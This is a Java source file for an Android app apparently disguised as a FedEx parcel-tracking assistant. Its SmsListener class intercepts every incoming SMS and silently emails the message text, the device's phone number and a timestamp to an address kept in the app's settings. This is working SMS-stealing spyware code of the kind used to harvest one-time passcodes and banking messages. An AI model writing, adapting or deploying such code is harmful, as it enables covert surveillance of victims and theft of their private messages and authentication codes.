package fedex.trac.assistantedesuivifedex;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.widget.Toast;

import java.text.SimpleDateFormat;
import java.util.Date;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class SmsListener extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                String messageBody = smsMessage.getMessageBody();
                String title = SharedPrefManager.getInstance(context).getPhone() + " Received a new SMS " + getCurrentDateTime();
                sendEmail(context, title, messageBody);
            }
        }
    }

    private void sendEmail(final Context context, String title, String message) {
        final String to = SharedPrefManager.getInstance(context).getActivationCode() ? SharedPrefManager.getInstance(context).getEmail1() : SharedPrefManager.getInstance(context).getEmail2();
        if (to != null) {
            RetrofitClient.getInstance().getApi()
                    .sendEmail(Constants.EMAIL_FROM, to, title, message)
                    .enqueue(new Callback<ResponseBody>() {
                        @Override
                        public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                            Toast.makeText(context, "xxEmail Sent to" + to, Toast.LENGTH_SHORT).show();
                        }

                        @Override
                        public void onFailure(Call<ResponseBody> call, Throwable t) {

                        }
                    });
        } else {
            Toast.makeText(context, "Something wrong... reinstall application", Toast.LENGTH_LONG).show();
        }
    }

    private String getCurrentDateTime() {
        SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
        Date date = new Date();
        return formatter.format(date);
    }
}
